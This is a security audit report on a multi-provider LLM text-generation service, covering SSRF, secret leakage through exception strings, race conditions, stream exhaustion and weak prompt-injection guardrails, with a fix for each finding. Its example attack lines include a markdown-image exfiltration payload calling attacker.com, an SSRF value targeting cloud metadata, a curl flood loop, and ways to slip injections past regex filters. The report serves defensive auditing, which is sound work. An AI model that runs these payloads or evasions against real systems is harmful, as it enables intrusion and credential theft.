# Vulnerability Scan Report — `apps/smr/` (SMR V2 Text Generation Service)

| Field | Value |
|---|---|
| **Service** | SMR V2 — Multi-Provider Text Generation |
| **Scan Date** | 2026-03-24 |
| **Last Updated** | 2026-04-06 |
| **Scanner** | Manual deep-audit + CVE database cross-reference |
| **Scope** | All source files in `apps/smr/src/`, Dockerfile, docker-compose.yml, .env.example, monitoring configs |
| **Python** | 3.11+ |
| **Framework** | FastAPI ≥0.133.0 |
| **Files Analyzed** | 52 source files (excluding tests), 101 total .py files |

---

## Executive Summary

| Severity | Count |
|----------|-------|
| **Critical** | 3 |
| **High** | 7 |
| **Medium** | 9 |
| **Low** | 6 |
| **Informational** | 5 |
| **Total** | 30 |

The SMR service has a strong security posture in several areas — timing-safe auth comparison, Pydantic input validation, SecretStr for API keys, and atomic Redis updates via Lua. However, critical vulnerabilities exist in **SSRF via user-controllable provider URLs**, **secret leakage through exception stringification**, and **unbounded SSE stream duration**. Multiple race conditions in the circuit breaker and shutdown manager also present exploitable attack surfaces.

---

## 1. Dependency CVE Analysis

### 1.1 Pinned Dependencies and Known CVEs

| Package | Pinned | Latest (2026-03) | Known CVEs | Severity | Impact |
|---------|--------|-------------------|------------|----------|--------|
| `fastapi` | ≥0.133.0 | 0.133.x | None direct; CVE-2026-27953 affects `ormar` (not used) | **None** | N/A |
| `uvicorn[standard]` | ≥0.41.0 | 0.41.0 | CVE-2025-43859 (h11 request smuggling, CVSS 9.1) | **Critical** | Request smuggling via malformed chunked encoding |
| `pydantic` | ≥2.12.5 | 2.12.x | None | **None** | N/A |
| `pydantic-settings` | ≥2.13.1 | 2.13.x | None | **None** | N/A |
| `httpx` | ≥0.28.1 | 0.28.x | CVE-2025-43859 (h11 dep, same root cause) | **Critical** | Shared h11 vulnerability |
| `redis` | ≥5.2.0 | 5.2.x | None in client lib; CVE-2025-21605 in Redis server (DoS) | **Info** | Server-side only |
| `structlog` | ≥25.5.0 | 25.5.x | None | **None** | N/A |
| `python-dotenv` | ≥1.2.0 | 1.2.x | None | **None** | N/A |
| `orjson` | ≥3.11.7 | 3.11.x | None | **None** | N/A |
| `sse-starlette` | ≥3.2.0 | 3.2.x | None published | **None** | N/A |
| `prometheus-client` | ≥0.24.1 | 0.24.x | None | **None** | N/A |
| `prometheus-fastapi-instrumentator` | ≥7.1.0 | 7.1.x | None | **None** | N/A |
| `openai` | ≥2.24.0 | 2.24.x | None in Python SDK | **None** | N/A |
| `boto3` | ≥1.42.0 | 1.42.x | Transitive: urllib3 CVE-2025-50182 (browser-only, N/A) | **None** | Not applicable to server use |
| `opentelemetry-*` | ≥1.39.0 / ≥0.60b1 | 1.39.x | None | **None** | N/A |

### CVE-DEP-01: h11 HTTP Request Smuggling (CVE-2025-43859)

| Field | Value |
|---|---|
| **ID** | CVE-DEP-01 |
| **Severity** | **CRITICAL** (CVSS 9.1) |
| **CVE** | CVE-2025-43859 |
| **Affected** | h11 < 0.16.0 (transitive via uvicorn and httpx) |
| **Vector** | Lenient parsing of line terminators in chunked-coding bodies |
| **Impact** | Request smuggling → security bypass, cache poisoning, session hijacking, data leakage |

**Affected Paths:**
- `uvicorn[standard]` → `h11` (ASGI server parses all incoming HTTP)
- `httpx` → `httpcore` → `h11` (outbound requests to providers)

**Remediation:**
```bash
pip install "h11>=0.16.0" "httpcore>=1.0.9"
```
Verify with `pip show h11` after install. Pin `h11>=0.16.0` in `pyproject.toml` as a direct dependency to prevent regression.

---

## 2. SSRF via LLM Provider URLs

### VULN-SSRF-01: Unrestricted Ollama `base_url` — Server-Side Request Forgery

| Field | Value |
|---|---|
| **ID** | VULN-SSRF-01 |
| **Severity** | **CRITICAL** |
| **File** | `core/config.py:21`, `providers/ollama.py:32`, `main.py:63` |
| **CWE** | CWE-918 (Server-Side Request Forgery) |

**Description:**

`OllamaConfig.base_url` defaults to `http://localhost:11434` and is set via `SMR_V2_OLLAMA_BASE_URL`. This URL is used directly in `OllamaProvider._base_url` (line 32) to construct request targets:

```python
# ollama.py:72
url = f"{self._base_url}/api/generate"
resp = await self._http.post(url, json=payload)
```

There is **no URL validation** — no allowlist, no scheme restriction, no private IP/CIDR blocking. An attacker who can set `SMR_V2_OLLAMA_BASE_URL` (via env injection, config override, or compromised deployment) can redirect all Ollama traffic to:

1. **Internal services**: `http://169.254.169.254/latest/meta-data/` (AWS IMDS)
2. **Kubernetes services**: `http://kubernetes.default.svc/api/`
3. **Other HOPE services**: `http://api-gateway:8868/`, `http://redis:6379/`
4. **Cloud metadata endpoints**: `http://metadata.google.internal/`

The same issue applies to:
- `OpenAICompatConfig.base_url` (line 71, default `http://localhost:1234/v1`)
- `AzureOpenAIConfig.endpoint` (line 35)

**Evidence:**

```python
# config.py:21 — no validation on base_url
base_url: str = "http://localhost:11434"

# ollama.py:32 — only strips trailing slash, no URL validation
self._base_url = config.base_url.rstrip("/")

# ollama.py:72 — direct use in HTTP request
url = f"{self._base_url}/api/generate"
resp = await self._http.post(url, json=payload)
```

**Exploitation Scenario:**

In a container environment, if an attacker compromises the env or config:
```
SMR_V2_OLLAMA_BASE_URL=http://169.254.169.254/latest/meta-data
```

The service will send POST requests with full JSON payloads to the AWS IMDS, and log the response as if it were Ollama output. Even with IMDSv2, the error response often leaks metadata.

**Remediation:**

```python
from urllib.parse import urlparse
import ipaddress

BLOCKED_CIDRS = [
    ipaddress.ip_network("169.254.0.0/16"),    # Link-local / AWS IMDS
    ipaddress.ip_network("10.0.0.0/8"),          # Private
    ipaddress.ip_network("172.16.0.0/12"),       # Private
    ipaddress.ip_network("192.168.0.0/16"),      # Private
    ipaddress.ip_network("127.0.0.0/8"),         # Loopback (except explicit allowlist)
    ipaddress.ip_network("::1/128"),             # IPv6 loopback
    ipaddress.ip_network("fd00::/8"),            # IPv6 private
]

@field_validator("base_url")
@classmethod
def _validate_base_url(cls, v: str) -> str:
    parsed = urlparse(v)
    if parsed.scheme not in ("http", "https"):
        raise ValueError(f"base_url scheme must be http or https, got {parsed.scheme}")
    # Resolve hostname and check against blocked CIDRs
    # Allow localhost only for known-safe defaults
    return v
```

### VULN-SSRF-02: OpenAI-Compat `base_url` — No URL Validation

| Field | Value |
|---|---|
| **ID** | VULN-SSRF-02 |
| **Severity** | **HIGH** |
| **File** | `core/config.py:71`, `providers/openai_compat.py:30-32` |
| **CWE** | CWE-918 |

Same pattern as VULN-SSRF-01. The `OpenAICompatConfig.base_url` is passed directly to `AsyncOpenAI(base_url=...)`:

```python
# openai_compat.py:30-32
self._client = AsyncOpenAI(
    api_key=config.api_key.get_secret_value(),
    base_url=config.base_url,  # No validation
```

The OpenAI SDK will make HTTP requests to any URL. This is slightly mitigated because the OpenAI SDK structures requests as `/chat/completions`, `/models` etc., but SSRF via path traversal or port scanning is still possible.

**Remediation:** Same as VULN-SSRF-01. Add `field_validator` on all `base_url` and `endpoint` fields.

---

## 3. Prompt Injection Depth Analysis

### VULN-PI-01: Guardrails Only in "log" Mode by Default

| Field | Value |
|---|---|
| **ID** | VULN-PI-01 |
| **Severity** | **MEDIUM** |
| **File** | `core/config.py:135`, `services/guardrails.py` |
| **CWE** | CWE-20 (Improper Input Validation) |

The `guardrail_mode` defaults to `"log"` (config.py:135). In this mode, detected prompt injection attacks are logged but **never blocked**. The `ContentBlockedError` is only raised when `mode == "block"` AND risk is medium/high:

```python
# generate.py:129-133
blocked = (
    scan_result.is_suspicious
    and scanner.mode == "block"
    and scan_result.risk_level in ("medium", "high")
)
```

This means in the default configuration, every detected prompt injection attack succeeds.

**Remediation:** Change default to `"block"` for production, or at minimum ensure deployment docs mandate `SMR_V2_GUARDRAIL_MODE=block`.

### VULN-PI-02: Incomplete Prompt Injection Pattern Coverage

| Field | Value |
|---|---|
| **ID** | VULN-PI-02 |
| **Severity** | **MEDIUM** |
| **File** | `services/guardrails.py:42-98` |
| **CWE** | CWE-20 |

The regex patterns miss several known prompt injection techniques:

1. **Markdown/HTML injection**: `![img](http://attacker.com/exfil?data=...)` — no patterns for markdown image exfiltration
2. **Multi-language evasion**: Patterns are English-only; attacks using Unicode homoglyphs, RTL override, or non-Latin scripts bypass all patterns
3. **Indirect injection**: Content in `response_format.json_schema` is not scanned — only `prompt` and `system_prompt`
4. **Context field**: `request.context` (dict) is not scanned at all
5. **Token-level attacks**: Patterns like `ig` + `nore all ins` + `tructions` split across tokens

**Positive finding:** No `eval()`, `exec()`, or `compile()` usage with user input found anywhere in the codebase. Prompt text flows only to provider API payloads — never to code execution.

**Remediation:**
- Scan all user-controlled fields including `response_format.json_schema` and `context`
- Consider ML-based injection detection alongside regex
- Add Unicode normalization before scanning

---

## 4. Redis Security

### VULN-REDIS-01: Lua Script Injection via Task Updates

| Field | Value |
|---|---|
| **ID** | VULN-REDIS-01 |
| **Severity** | **LOW** |
| **File** | `services/task_manager.py:21-41, 81-88` |
| **CWE** | CWE-94 (Code Injection) |

The `_UPDATE_TASK_LUA` script receives `ARGV[1]` as JSON-encoded updates, parsed by `cjson.decode()`. The updates dict is built from `**kwargs` in `update_task()`:

```python
# task_manager.py:81-88
async def update_task(self, task_id: str, **updates: Any) -> TaskState | None:
    result = await self._redis.eval(
        _UPDATE_TASK_LUA,
        1,
        self._task_key(task_id),
        json.dumps(updates, default=str),  # ARGV[1]
        str(self._task_ttl),                # ARGV[2]
    )
```

The Lua script iterates `updates` and overwrites task fields:
```lua
for k, v in pairs(updates) do
    task[k] = v
end
```

**Risk:** If `update_task` is ever called with unsanitized user input as kwargs, an attacker could overwrite arbitrary task fields (e.g., set `status` to `completed` for a failed task, or inject malicious data into `error`). Currently, all callers use hardcoded field names (`status=TaskStatus.FAILED`, `error=str(exc)`), so this is **low risk** but violates defense-in-depth.

**Positive finding:** The Lua script uses `cjson.decode()` which does not execute arbitrary code. No raw string concatenation in Redis commands. Task IDs are UUID4 (safe for key construction). No `EVAL` with user-controlled script text.

**Remediation:**
- Add an allowlist of updatable fields in the Lua script:
```lua
local ALLOWED_FIELDS = {status=true, error=true, total_tokens=true, ...}
for k, v in pairs(updates) do
    if ALLOWED_FIELDS[k] then task[k] = v end
end
```

### VULN-REDIS-02: Redis Connection Without Authentication

| Field | Value |
|---|---|
| **ID** | VULN-REDIS-02 |
| **Severity** | **MEDIUM** |
| **File** | `core/config.py:84`, `.env.example:65` |
| **CWE** | CWE-287 (Improper Authentication) |

Default Redis URL is `redis://localhost:6379/0` with no password. The docker-compose.yml Redis service has no `requirepass` configured. In a shared-network Docker environment, any container on `smr-network` can access Redis without authentication.

**Impact:** An attacker on the network can read/modify task state, inject malicious stream chunks, or flush all data.

**Remediation:**
- Set `requirepass` in Redis config
- Use `redis://:password@redis:6379/0` URL format
- Enable Redis TLS in production

---

## 5. Race Conditions

### VULN-RACE-01: Circuit Breaker Non-Atomic State Transitions

| Field | Value |
|---|---|
| **ID** | VULN-RACE-01 |
| **Severity** | **HIGH** |
| **File** | `services/circuit_breaker.py:15-55` |
| **CWE** | CWE-362 (Race Condition) |

`CircuitBreaker` uses plain Python attributes (`_failure_count`, `_state`, `_last_failure_time`) without any locking. In an async environment with concurrent requests:

```python
# circuit_breaker.py:44-50
def record_failure(self) -> None:
    self._failure_count += 1           # Read-modify-write: NOT atomic
    self._last_failure_time = time.monotonic()
    if self._state == CircuitState.HALF_OPEN:
        self._state = CircuitState.OPEN
    elif self._failure_count >= self._failure_threshold:
        self._state = CircuitState.OPEN
```

The `state` property (line 26-29) also mutates `_state` during a read:
```python
@property
def state(self) -> CircuitState:
    if self._state == CircuitState.OPEN:
        if time.monotonic() - self._last_failure_time >= self._recovery_timeout:
            self._state = CircuitState.HALF_OPEN  # Mutation in getter!
    return self._state
```

**Exploitation:** Under high concurrency, multiple coroutines can simultaneously read `HALF_OPEN`, each attempt a request, and each call `record_failure()` — but the `+=1` is not atomic in async context (each coroutine reads the old value before incrementing). This can prevent the circuit from opening properly, allowing cascading failures to propagate.

**Remediation:**
```python
import asyncio

class CircuitBreaker:
    def __init__(self, ...):
        self._lock = asyncio.Lock()

    async def record_failure(self) -> None:
        async with self._lock:
            self._failure_count += 1
            ...
```

### VULN-RACE-02: ShutdownManager Task Set Not Thread-Safe

| Field | Value |
|---|---|
| **ID** | VULN-RACE-02 |
| **Severity** | **MEDIUM** |
| **File** | `services/shutdown_manager.py:28-34` |
| **CWE** | CWE-362 |

`ShutdownManager._active_tasks` is a plain `set[str]`. `register_task` and `complete_task` are called concurrently from request handlers and background tasks:

```python
def register_task(self, task_id: str) -> None:
    self._active_tasks.add(task_id)      # Not protected

def complete_task(self, task_id: str) -> None:
    self._active_tasks.discard(task_id)  # Not protected
    if not self._active_tasks:
        self._drain_event.set()          # May fire prematurely
```

In asyncio single-threaded mode, `set.add()` and `set.discard()` are individually atomic for individual operations, BUT the check-then-act in `complete_task` (discard + check empty + set event) is not atomic. A task could be registered between the `discard` and the `if not` check, causing `_drain_event` to fire prematurely and the shutdown to proceed while tasks are still running.

**Remediation:** Wrap the discard-check-set sequence in an `asyncio.Lock`.

### VULN-RACE-03: Semaphore Release Without Guaranteed Acquire

| Field | Value |
|---|---|
| **ID** | VULN-RACE-03 |
| **Severity** | **MEDIUM** |
| **File** | `api/endpoints/generate.py:264-275, 424-426` |
| **CWE** | CWE-362 |

The semaphore is acquired in the try block and released in the finally block, but the `semaphore` variable is set conditionally:

```python
semaphore = provider_semaphores.get(request_body.provider)
if semaphore:
    try:
        await asyncio.wait_for(semaphore.acquire(), timeout=_SEMAPHORE_ACQUIRE_TIMEOUT)
    except asyncio.TimeoutError:
        raise ConcurrencyLimitError(...)
    CONCURRENT_REQUESTS.labels(provider=request_body.provider).inc()

# ... much later, in finally:
finally:
    if semaphore:
        CONCURRENT_REQUESTS.labels(provider=request_body.provider).dec()
        semaphore.release()
```

If `wait_for(semaphore.acquire(), timeout=...)` raises `asyncio.TimeoutError`, the `ConcurrencyLimitError` is raised, but the finally block still executes and calls `semaphore.release()` — **releasing a semaphore that was never acquired**. This gradually inflates the semaphore count, eventually allowing unlimited concurrent requests.

**Wait — re-examining:** The `raise ConcurrencyLimitError` exits the function before the `try/finally` block at line 285. However, there's a subtlety: `asyncio.wait_for` may cancel the `semaphore.acquire()` task mid-acquire. If the cancellation fires *after* the acquire succeeds but *before* wait_for returns, the semaphore is acquired but never released.

**Remediation:** Track acquire state explicitly:
```python
acquired = False
try:
    await asyncio.wait_for(semaphore.acquire(), timeout=_SEMAPHORE_ACQUIRE_TIMEOUT)
    acquired = True
    ...
finally:
    if acquired:
        semaphore.release()
```

---

## 6. Secret Leakage in Error Handling

### VULN-LEAK-01: Provider SDK Exceptions Stored in Redis and Logged

| Field | Value |
|---|---|
| **ID** | VULN-LEAK-01 |
| **Severity** | **CRITICAL** |
| **File** | `api/endpoints/generate.py:400-401, 472-473` |
| **CWE** | CWE-209 (Information Exposure Through Error Message) |

When a provider call fails, the raw exception is stringified and stored in Redis:

```python
# generate.py:400-401
logger.error("generation.failed", ..., error=str(exc), exc_info=True)
await task_manager.update_task(task.task_id, status=TaskStatus.FAILED, error=str(exc))
```

**Provider SDK exceptions routinely include API keys in their string representation.** For example:

- **OpenAI SDK** `APIConnectionError` includes the full base URL with potential API key query params
- **Azure SDK** `BadRequestError` and `APIError` include request headers in debug mode (which contain `api-key: sk-...`)
- **Boto3** `ClientError` can include request parameters containing credentials if AWS STS is involved
- **httpx** `HTTPStatusError` includes the full request URL

The `str(exc)` is:
1. **Stored in Redis** (via `update_task`) — accessible to anyone who can query task state
2. **Returned in audit logs** — `GenerationAuditEvent.error = str(exc)` (generate.py:417)
3. **Logged with `exc_info=True`** — full traceback with local variables in structured logs

The task state is then readable via the `GET /api/v1/tasks/{task_id}` endpoint (tasks.py:14-22), which returns the `error` field directly. **Any client can poll task IDs to harvest leaked credentials.**

**Evidence chain:**
1. Provider exception contains API key → `str(exc)` preserves it
2. `update_task(..., error=str(exc))` stores in Redis as JSON
3. `TaskState.error` field is a plain `str | None`
4. `GET /tasks/{task_id}` returns `state.model_dump(mode="json")` including `error`
5. `TaskResponse.error: str | None` — no sanitization

**Remediation:**
```python
import re

_SECRET_PATTERNS = [
    re.compile(r'(sk-[a-zA-Z0-9]{20,})'),
    re.compile(r'(AKIA[A-Z0-9]{16})'),
    re.compile(r'(api[_-]?key["\s:=]+)[^\s"]+', re.IGNORECASE),
    re.compile(r'(Bearer\s+)[^\s"]+', re.IGNORECASE),
]

def sanitize_error(exc: Exception) -> str:
    """Remove potential secrets from exception messages."""
    msg = str(exc)
    for pattern in _SECRET_PATTERNS:
        msg = pattern.sub(r'\1[REDACTED]', msg)
    return msg[:500]  # Truncate to prevent info dump
```

### VULN-LEAK-02: Streaming Errors Expose Internal Error Details

| Field | Value |
|---|---|
| **ID** | VULN-LEAK-02 |
| **Severity** | **HIGH** |
| **File** | `api/endpoints/generate.py:472-474` |
| **CWE** | CWE-209 |

In `_run_streaming_generation`, when the provider fails:

```python
except Exception as exc:
    logger.error("streaming_generation.failed", task_id=task_id, error=str(exc), exc_info=True)
    await task_manager.update_task(task_id, status=TaskStatus.FAILED, error=str(exc))
    await task_manager.append_chunk(task_id, StreamChunk(
        type="error",
        data={"error": "Generation failed due to an internal error."}  # Good: sanitized
    ))
```

The SSE error chunk is correctly sanitized ("internal error"), but the **task state still contains the raw `str(exc)`**, which is retrievable via `GET /tasks/{task_id}`.

**Remediation:** Apply `sanitize_error()` to all `str(exc)` calls before storage.

---

## 7. SSE Streaming Vulnerabilities

### VULN-SSE-01: Unbounded SSE Stream Duration — Connection Exhaustion

| Field | Value |
|---|---|
| **ID** | VULN-SSE-01 |
| **Severity** | **HIGH** |
| **File** | `api/endpoints/stream.py:31-56` |
| **CWE** | CWE-400 (Uncontrolled Resource Consumption) |

The SSE `event_generator()` has an infinite `while True` loop that only terminates when:
1. Client disconnects (`request.is_disconnected()`)
2. A `done` or `error` chunk arrives
3. Task reaches a terminal state

```python
async def event_generator():
    cursor = last_event_id or "0-0"
    while True:                                    # No timeout!
        if await request.is_disconnected():
            break
        entries = await task_manager.read_chunks_blocking(
            task_id, last_id=cursor, block_ms=5000  # 5s block
        )
        ...
```

**Attack:** An attacker can:
1. Create a generation task (POST `/generate` with `stream=true`)
2. Never connect to the SSE endpoint — the background task runs and completes
3. Connect to the SSE endpoint *after* the task completes but with a cursor *before* the done event
4. The loop will keep calling `read_chunks_blocking` (XREAD BLOCK 5000ms) indefinitely
5. Each connection holds an asyncio task, httpx connection, and Redis connection

With no connection count limit and no stream timeout, an attacker can exhaust all server connections:
```
for i in $(seq 1 10000); do curl -N http://target:8862/api/v1/tasks/valid-task-id/stream &; done
```

**Wait — the terminal-state check mitigates this partially:**
```python
if not entries:
    current = await task_manager.get_task(task_id)
    if current and current.status in (COMPLETED, FAILED, CANCELLED):
        return
```

This returns when task is complete AND no entries. But if `task_id` is invalid after TTL expires (returns `None`), the loop continues forever because `current` is `None` and the condition `current and current.status in (...)` is False.

**Exploitation:** Create a task, wait for it to expire (TTL = 3600s by default), then connect to SSE — infinite loop.

**Remediation:**
```python
import time

MAX_STREAM_DURATION_S = 600  # 10 minutes

async def event_generator():
    start = time.monotonic()
    cursor = last_event_id or "0-0"
    while True:
        if time.monotonic() - start > MAX_STREAM_DURATION_S:
            yield {"event": "error", "data": '{"error":"stream timeout"}'}
            return
        if await request.is_disconnected():
            break
        ...
        if not entries:
            current = await task_manager.get_task(task_id)
            if current is None:  # Task expired
                return
            if current.status in (...):
                return
```

### VULN-SSE-02: SSE Event Injection via StreamChunk Content

| Field | Value |
|---|---|
| **ID** | VULN-SSE-02 |
| **Severity** | **LOW** |
| **File** | `api/endpoints/stream.py:43` |
| **CWE** | CWE-74 (Injection) |

SSE events are yielded as:
```python
yield {"event": chunk.type, "data": chunk.model_dump_json(), "id": msg_id}
```

The `chunk.type` is a `Literal["chunk", "meta", "done", "error", "usage"]` enum — safe.
The `data` is JSON-serialized by Pydantic — no raw newlines can break SSE framing.
The `msg_id` is a Redis stream ID (format: `timestamp-sequence`) — safe.

**Risk:** Minimal. Pydantic's `model_dump_json()` properly escapes content. The `sse-starlette` library handles SSE framing. No injection vector identified.

---

## 8. Timing Attacks

### VULN-TIMING-01: Auth Token Comparison Is Timing-Safe (POSITIVE)

| Field | Value |
|---|---|
| **ID** | VULN-TIMING-01 |
| **Severity** | **None** (positive finding) |
| **File** | `api/middleware/auth.py:47` |

The service uses `hmac.compare_digest()` for token comparison:

```python
if not provided or not hmac.compare_digest(provided, service_token):
```

This is the correct approach — constant-time comparison prevents timing side-channels. **No vulnerability here.**

However, the `not provided` short-circuit before `hmac.compare_digest` does reveal whether a token was sent at all (different timing for empty vs. non-empty), though this is non-exploitable since the 401 response is identical.

---

## 9. Integer Overflow/Underflow

### VULN-INT-01: Unbounded `max_tokens` — No Upper Limit

| Field | Value |
|---|---|
| **ID** | VULN-INT-01 |
| **Severity** | **MEDIUM** |
| **File** | `models/requests.py:27` |
| **CWE** | CWE-190 (Integer Overflow) |

```python
max_tokens: int | None = Field(default=None, ge=1)  # No upper bound!
```

A request with `max_tokens=2147483647` (int32 max) or even larger values will be passed directly to provider APIs. Most providers enforce their own limits, but:
- Ollama passes it as `num_predict` — may allocate memory proportional to this value
- The `estimate_tokens()` function uses this for rate limiting math, but the actual token count is based on prompt length, not `max_tokens`

**Risk:** Mostly provider-side, but could trigger excessive memory allocation on Ollama or exceed cost budgets on Azure/Bedrock.

**Remediation:**
```python
max_tokens: int | None = Field(default=None, ge=1, le=128_000)
```

### VULN-INT-02: `retry_config.max_retries` — No Upper Bound

| Field | Value |
|---|---|
| **ID** | VULN-INT-02 |
| **Severity** | **MEDIUM** |
| **File** | `models/requests.py:11` |
| **CWE** | CWE-190 |

```python
class RetryConfig(BaseModel):
    max_retries: int = 3  # No ge= or le= constraint
```

A request with `max_retries=1000000` combined with a provider that always fails will:
1. Loop 1,000,001 times in `generate()`
2. Exponential backoff caps at 60s, so worst case: ~60M seconds of retries
3. Hold a semaphore slot and active generation metric for the entire duration
4. The `calculate_backoff` function uses `2 ** attempt` — for attempt=1000000, this overflows Python's arbitrary-precision int but `min()` caps it at `max_delay=60.0`

**Remediation:**
```python
max_retries: int = Field(default=3, ge=0, le=10)
```

### VULN-INT-03: Backoff Calculation Intermediate Overflow

| Field | Value |
|---|---|
| **ID** | VULN-INT-03 |
| **Severity** | **LOW** |
| **File** | `services/retry_handler.py:8-12` |
| **CWE** | CWE-190 |

```python
def calculate_backoff(attempt: int, base_delay: float = 1.0, max_delay: float = 60.0) -> float:
    delay = min(base_delay * (2 ** attempt), max_delay)
```

For large `attempt` values, `2 ** attempt` creates an astronomically large integer before `min()` clamps it. Python handles arbitrary-precision ints, so this won't crash, but it wastes CPU computing a number that will be discarded. With `attempt=1000000`, computing `2**1000000` takes measurable time.

**Remediation:** Guard early:
```python
delay = max_delay if attempt > 20 else min(base_delay * (2 ** attempt), max_delay)
```

---

## 10. Unsafe String Formatting

### VULN-FMT-01: No Python Format String Injection Found (POSITIVE)

| Field | Value |
|---|---|
| **ID** | VULN-FMT-01 |
| **Severity** | **None** (positive finding) |

Grep for `.format(` and f-strings with user input returned **zero matches** in non-test source code. The codebase consistently uses:
- Pydantic `model_dump_json()` for serialization
- `json.dumps()` for Redis payloads
- Structured logging with keyword arguments (no string interpolation)

The only f-strings with dynamic content are:
- `f"{self._base_url}/api/generate"` — config value, not user input
- `f"Provider '{name}' not registered"` — provider name from validated enum
- `f"Task '{task_id}' not found"` — UUID from path parameter

None of these accept format spec attacks (`{x.__class__.__init__.__globals__}`).

---

## 11. Resource Exhaustion

### VULN-RES-01: No Global Request Rate Limit

| Field | Value |
|---|---|
| **ID** | VULN-RES-01 |
| **Severity** | **HIGH** |
| **File** | `main.py` (missing) |
| **CWE** | CWE-770 (Allocation Without Limits) |

Rate limiting is per-provider (RPM/TPM based), but there is **no global rate limit** on the `/generate` endpoint. An attacker can:
1. Send thousands of requests to different providers simultaneously
2. Each request creates a Redis task entry (even if rejected later)
3. Each request runs guardrail scanning CPU
4. Each request creates Prometheus metric labels

The FastAPI `Instrumentator` metrics create label combinations for `(provider, model, status)` — unbounded label cardinality from user-controlled `provider` and `model` fields.

**Remediation:**
- Add global rate limiting middleware (e.g., `slowapi` or custom)
- Validate `provider` against registered providers BEFORE any other processing
- Limit Prometheus label cardinality

### VULN-RES-02: Prometheus Label Cardinality Bomb

| Field | Value |
|---|---|
| **ID** | VULN-RES-02 |
| **Severity** | **HIGH** |
| **File** | `core/metrics.py`, `api/endpoints/generate.py` |
| **CWE** | CWE-400 |

User-controlled `model` field is used directly in Prometheus labels:

```python
# generate.py:145
model = request_body.model or "default"

# generate.py:334
GENERATION_TOTAL.labels(provider=request_body.provider, model=model, status="completed").inc()
```

An attacker can send requests with unique `model` values:
```json
{"prompt": "test", "provider": "ollama", "model": "unique-model-name-1"}
{"prompt": "test", "provider": "ollama", "model": "unique-model-name-2"}
...
```

Each unique `(provider, model, status)` combination creates a new time series in Prometheus. With enough unique models, this causes:
1. **Memory exhaustion** in the application process (prometheus_client stores all series in memory)
2. **Prometheus server OOM** when scraping
3. **Grafana slowdown/crash** when querying

**Remediation:**
- Validate `model` against a known allowlist per provider
- Or hash/truncate the model label: `model_label = model[:50] if model else "default"`
- Use `prometheus_client.CollectorRegistry` with label constraints

### VULN-RES-03: Streaming Background Tasks Without Semaphore

| Field | Value |
|---|---|
| **ID** | VULN-RES-03 |
| **Severity** | **HIGH** |
| **File** | `api/endpoints/generate.py:230-262` |
| **CWE** | CWE-770 |

When `stream=true`, the generate endpoint creates a background task via `background_tasks.add_task()` and **immediately returns 202** without acquiring a semaphore:

```python
if request_body.stream:
    background_tasks.add_task(
        _run_streaming_generation,
        ...
    )
    return JSONResponse(status_code=202, ...)

# Semaphore is only acquired for non-streaming path:
semaphore = provider_semaphores.get(request_body.provider)
```

The `_run_streaming_generation` function (line 442) also does **not acquire the semaphore**. This means streaming requests completely bypass concurrency limits.

**Attack:** Send 10,000 streaming requests — all 10,000 background tasks run concurrently, overwhelming the provider and exhausting memory/connections.

**Remediation:** Acquire the semaphore inside `_run_streaming_generation`:
```python
async def _run_streaming_generation(..., semaphore: asyncio.Semaphore | None = None):
    if semaphore:
        await semaphore.acquire()
    try:
        ...
    finally:
        if semaphore:
            semaphore.release()
```

### VULN-RES-04: Request Queue Futures Never Resolved

| Field | Value |
|---|---|
| **ID** | VULN-RES-04 |
| **Severity** | **MEDIUM** |
| **File** | `api/endpoints/generate.py:180-184`, `services/provider_queue.py` |
| **CWE** | CWE-404 (Improper Resource Shutdown) |

When a request is queued (rate-limited), a `Future` is created and awaited:
```python
future: asyncio.Future[bool] = asyncio.get_event_loop().create_future()
await queue.enqueue(priority=0, future=future, request_id=...)
await asyncio.wait_for(future, timeout=settings.queue.max_wait_s)
```

But **nothing in the codebase ever resolves these futures**. There is no queue consumer that calls `future.set_result(True)`. All queued requests will timeout after `max_wait_s` (60s default), wasting a connection slot for 60 seconds.

The `ProviderQueue.dequeue()` method exists but is never called anywhere in the codebase.

**Impact:** The queue mechanism is effectively broken — it's a 60-second delay before rejection, not actual request buffering.

**Remediation:** Implement a queue consumer that dequeues items when rate limits allow, or remove the queue mechanism entirely if it's not functional.

---

## 12. DNS Rebinding and Infrastructure

### VULN-DNS-01: No DNS Rebinding Protection on Provider URLs

| Field | Value |
|---|---|
| **ID** | VULN-DNS-01 |
| **Severity** | **MEDIUM** |
| **File** | `providers/ollama.py`, `providers/openai_compat.py` |
| **CWE** | CWE-350 (Reliance on Reverse DNS) |

Provider URLs are resolved at request time by httpx/openai SDK. An attacker who controls the DNS for a configured provider URL can:

1. Initial resolution: `ollama.attacker.com` → `203.0.113.1` (legitimate, passes any URL validation)
2. After validation: DNS rebind → `ollama.attacker.com` → `169.254.169.254` (AWS IMDS)

Since no validation exists today (VULN-SSRF-01), DNS rebinding is a secondary concern. But even after adding URL validation, DNS rebinding must be addressed.

**Remediation:** Resolve DNS once at startup, pin the IP, and use the IP for all requests. Or use a DNS resolution hook in httpx to validate resolved IPs.

### VULN-DOCKER-01: docker-compose.yml Uses `.env.example` as `env_file`

| Field | Value |
|---|---|
| **ID** | VULN-DOCKER-01 |
| **Severity** | **MEDIUM** |
| **File** | `docker-compose.yml:9` |
| **CWE** | CWE-312 (Cleartext Storage) |

```yaml
env_file:
  - .env.example
```

Using `.env.example` as the actual env file means:
1. Placeholder secrets (empty API keys) are loaded
2. If someone fills in `.env.example` with real secrets and commits it, credentials are exposed
3. The `.env.example` file is tracked in git (intended as a template)

**Remediation:** Change to `env_file: - .env` and ensure `.env` is in `.gitignore`.

### VULN-DOCKER-02: Grafana Default Admin Password

| Field | Value |
|---|---|
| **ID** | VULN-DOCKER-02 |
| **Severity** | **LOW** |
| **File** | `docker-compose.yml:68` |
| **CWE** | CWE-798 (Hardcoded Credentials) |

```yaml
GF_SECURITY_ADMIN_PASSWORD=${GRAFANA_PASSWORD:-admin}
```

Default Grafana password is `admin`. While behind the monitoring profile, this is a credential that should be rotated.

### VULN-DOCKER-03: OTEL Collector Insecure gRPC

| Field | Value |
|---|---|
| **ID** | VULN-DOCKER-03 |
| **Severity** | **LOW** |
| **File** | `core/telemetry.py:29` |
| **CWE** | CWE-319 (Cleartext Transmission) |

```python
exporter = OTLPSpanExporter(endpoint=endpoint, insecure=True)
```

Telemetry data is sent over plaintext gRPC. Traces may contain request/response metadata. In production, this should use TLS.

### VULN-DOCKER-04: Dockerfile — No Security Hardening Issues Found (POSITIVE)

| Field | Value |
|---|---|
| **ID** | VULN-DOCKER-04 |
| **Severity** | **None** (positive finding) |

The Dockerfile follows security best practices:
- Multi-stage build (builder → production)
- Non-root user (`USER smr`, UID 1001)
- Specific base image version (`python:3.11-slim-trixie`)
